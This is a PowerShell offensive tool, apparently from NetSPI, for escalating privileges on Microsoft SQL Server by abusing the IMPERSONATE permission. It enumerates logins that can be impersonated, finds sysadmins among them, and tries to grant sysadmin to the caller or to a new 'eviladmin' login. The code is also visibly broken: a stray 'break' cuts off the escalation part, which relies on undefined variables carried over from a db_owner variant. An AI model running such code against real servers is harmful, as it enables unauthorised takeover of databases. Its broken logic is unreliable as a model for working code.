function Invoke-MssqlEscalateExecuteAs
{
    <#
	.SYNOPSIS
	   This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.

	.DESCRIPTION
	   This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
       In most cases this results in additional data access, but in some cases it can be used to gain sysadmin
       privileges.  This script can also be used to add a new sysadmin instead of escalating the privileges of
       the existing user.  Finally, I've provided an option to execute an arbitrary query as each of the user
       that can be impersonated.

	.EXAMPLE
	   Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.

	   PS C:\> Invoke-MssqlEscalateExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
	   [*] Connected.
	   [*] Enumerating users that myappuser can impersonate...
	   [*] 3 accounts can be impersonated.
	   [*] - user2
	   [*] - superuser
	   [*] - sa
	   [*] Checking if any of the users have the sysadmin role...
	   [*] The sa account has the sysadmin role!
	   [*] Attempting to evelate myappuser to sysadmin by impersonating the sa account...
	   [*] Success! - myappuser is now a sysadmin.
	   [*] All done.

	.EXAMPLE
	   Creating a new sysadmin as a user with permissions to impersonate the sa account.

	   PS C:\> Invoke-MssqlEscalateExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -NewUser evil admin -NewPass MyPassword!
	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
	   [*] Connected.
	   [*] Enumerating users that myappuser can impersonate...
	   [*] 3 accounts can be impersonated.
	   [*] - user2
	   [*] - superuser
	   [*] - sa
	   [*] Checking if any of the users have the sysadmin role...
	   [*] The sa account has the sysadmin role!
	   [*] Attempting to create the eviladmin sysadmin account by impersonating the sa account...
	   [*] Success! - eviladmin is now a sysadmin.
	   [*] All done.

	.LINK
	   http://www.netspi.com
	   http://msdn.microsoft.com/en-us/library/ms178640.aspx

	.NOTES
	   Author: Scott Sutherland - 2014, NetSPI
	   Version: Invoke-MssqlEscalateExecuteAs v1.0
	   Comments: This should work on SQL Server 2005 and Above.
    #>

  [CmdletBinding()]
  Param(
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login username.')]
    [string]$SqlUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login password.')]
    [string]$SqlPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login username.')]
    [string]$NewUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login password.')]
    [string]$NewPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Execute query under impersonated user context.')]
    [string]$Query,

    [Parameter(Mandatory=$true,
    HelpMessage='Set target SQL Server instance.')]
    [string]$SqlServerInstance
    
  )

    # -----------------------------------------------
    # Setup database connection string
    # -----------------------------------------------
    
    # Create fun connection object
    $conn = New-Object System.Data.SqlClient.SqlConnection
    
    # Set authentication type and create connection string    
    if($SqlUser -and $SqlPass){   
          
        # SQL login
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
        [string]$ConnectUser = $SqlUser
    }else{
          
        # Trusted connection
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"
        $UserDomain = [Environment]::UserDomainName
        $Username =  [Environment]::UserName
        $ConnectUser = "$UserDomain\$Username"
       
    }


    # -----------------------------------------------
    # Test database connection
    # -----------------------------------------------

    # Status User
    Write-Host "[*] Attempting to Connect to $SqlServerInstance as $ConnectUser..."
    
    try{
        $conn.Open()
        Write-Host "[*] Connected." -foreground "green"
        $conn.Close()
    }catch{
        $ErrorMessage = $_.Exception.Message
        Write-Host "[*] Connection failed" -foreground "red"
        Write-Host "[*] Error: $ErrorMessage" -foreground "red"  
        Break
    }


    # -----------------------------------------------
    # Check if the user is already a sysadmin
    # -----------------------------------------------

    # Open db connection
    $conn.Open()

    # Setup query
    $QueryElevate = "select is_srvrolemember('sysadmin') as IsSysAdmin"

    # Execute query
    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
    $results = $cmd.ExecuteReader() 

    # Parse query results
    $TableIsSysAdmin = New-Object System.Data.DataTable
    $TableIsSysAdmin.Load($results)  

    # Check if current user is a sysadmin
    $TableIsSysAdmin | Select-Object -First 1 IsSysAdmin | foreach {

        $Checksysadmin = $_.IsSysAdmin
        if ($Checksysadmin -ne 0){
                Write-Host "[*] You're already a sysadmin - no escalation needed." -foreground "green"
                Write-Host "[*] Done."
                Break             
        }
    }

    # Close db connection
    $conn.Close()

    # -----------------------------------------------
    # Get a list of the users that can be impersonated
    # -----------------------------------------------     
    
    # User status
    Write-Host "[*] Enumerating a list of users that can be impersonated..."  

    # Open db connection
    $conn.Open()

    # Setup query
    $QueryDatabases = "SELECT b.name
    FROM sys.server_permissions a
    INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id 
    WHERE a.permission_name = 'IMPERSONATE'"

    # Execute query    
    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn)
    $results = $cmd.ExecuteReader()

    # Parse query results
    $TableImpUsers = New-Object System.Data.DataTable 
    $TableImpUsers.Load($results)

    # Check if any users can be impersonated
    if ($TableImpUsers.rows.count -eq 0){

	    Write-Host "[*] The current user doesn't have permissions to impersonate anyone." -foreground "red"
    }else{
	    $ImpUserCount = $TableImpUsers.rows.count      
	    Write-Host "[*] Found $ImpUserCount users that can be impersonated:" -foreground "green"
        $TableImpUsers | foreach{
            $ImpUser = $_.name
            Write-Host "[*] - $ImpUser"
        }
    }

    # Close db connection
    $conn.Close() 

    # ----------------------------------------------------------------
    # Check if any of the users that can be impersonated are sysadmins
    # ----------------------------------------------------------------
    if ($TableImpUsers.rows.count -ne 0){	

        # Status user
        Write-Host "[*] Checking if any of them are sysadmins..."

        # Setup data table to store list of sysadmins that can be impersonated
        $TableImpUserSysAdmins = New-Object System.Data.DataTable
        $TableImpUserSysAdmins.Columns.Add('name') | Out-Null

	    $TableImpUsers | foreach {
            
            # Open db connection
            $conn.Open()

            # Setup query
            $ImpUser = $_.name
            $QueryElevate = "select IS_SRVROLEMEMBER('sysadmin','$ImpUser') as status"

            # Execute query
	        $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
	        $results = $cmd.ExecuteReader()             

            # Parse query results
            $TableImpUserSysAdminsCheck = New-Object System.Data.DataTable 
            $TableImpUserSysAdminsCheck.Load($results)

            $TableImpUserSysAdminsCheck | foreach{
                $SysAdminStatus = $_.status
            }
            
            # Check if the impersonatable user is a sysadmin
            if ($SysAdminStatus -eq 0){
	            Write-Host "[*] - $ImpUser - NOT sysadmin" -foreground "red"
            }else{
                Write-Host "[*] - $ImpUser - sysadmin!" -foreground "green"

                # Add to data table
                $TableImpUserSysAdmins.Rows.Add($ImpUser) | Out-Null     
            }

           # Clear check
           $TableImpUserSysAdminsCheck.Clear()

           # Close db connection
           $conn.Close()
        }
    }
    break
    # -------------------------------------------------
    # Attempt to escalate privileges
    # -------------------------------------------------

    # Get number database wwhere the user is db_owner
    $ImpUserSysadminsCount = $TableImpUserSysAdmins.rows.count 

    if ($ImpUserSysadminsCount -ne 0) {      
        
        # Set db to be used for escalating privs # fix this
        $TableDBOwner | Select-Object db -first 1 | foreach {
            $ElevateOnDb = $_.db            
        }

        # Add new user if provided
        if ($newuser -and $newPass){
            $AddUser = "CREATE LOGIN $newuser WITH PASSWORD = '$newPass'"
            $UsertoElevate = $newuser
            $Message = " create and"
        }else{
            $AddUser = ""
            $UsertoElevate = $ConnectUser
            $Message = ""
        }

        # Status user
        Write-Host "[*] $ConnectUser has db_owner role in $DbOwnerRoleCount of the databases." -foreground "green"
        Write-Host "[*] Attempting to$Message add $UsertoElevate to the sysadmin role via the $ElevateOnDb database..."      

        # Set authentication type and create connection string for the targeted database 
        if($SqlUser -and $SqlPass){   
           
            # SQL login
            $conn.Close()
            $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;User ID=$SqlUser;Password=$SqlPass;"
            [string]$ConnectUser = $SqlUser
        }else{
          
            # Trusted connection
            $conn.Close()
            $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;Integrated Security=SSPI;"
            $UserDomain = [Environment]::UserDomainName
            $Username =  [Environment]::UserName
            $ConnectUser = "$UserDomain\$Username"
       
        }

	# Create stored procedures to escalate privileges
        $conn.Open()
        $QueryElevate = "CREATE PROCEDURE sp_elevate_me
        WITH EXECUTE AS OWNER
        AS
        begin
        $AddUser
        EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin'
        end"
	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
	$results = $cmd.ExecuteReader() 
        $conn.Close()         

	# Execute stored procedures to escalate privileges
        $conn.Open()
        $QueryElevate = "EXEC sp_elevate_me"
	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
	$results = $cmd.ExecuteReader() 
        $conn.Close() 

	# Remove stored procedure
        $conn.Open()
        $QueryElevate = "drop proc sp_elevate_me"
	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
	$results = $cmd.ExecuteReader() 
        $conn.Close() 

	# Verify that privilege escalation works
        If (-Not ($newuser -and $newPass)){
            $conn.Open()
            $QueryElevate = "select is_srvrolemember('sysadmin') as IsSysAdmin"
            $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
            $results = $cmd.ExecuteReader() 
            $TableCheckforSysadmin.Load($results) 
            $conn.Close() 

            $TableCheckforSysadmin | Select-Object -First 1 IsSysAdmin | foreach {

                $Checksysadmin2 = $_.IsSysAdmin
                if ($Checksysadmin2 -ne 0){
                    Write-Host "[*] Success! - $UsertoElevate is now a sysadmin." -foreground "green" 
                }else{
                    Write-Host "[*] Sorry, something failed, no sysadmin for you." -foreground "red"
                }
            }    
         }       
    }else{
         Write-Host "[*] Sorry, $ConnectUser doesn't have the db_owner role in any of the sysadmin databases." -foreground "red" 
    }
    
	Write-Host "[*] All done." 
}
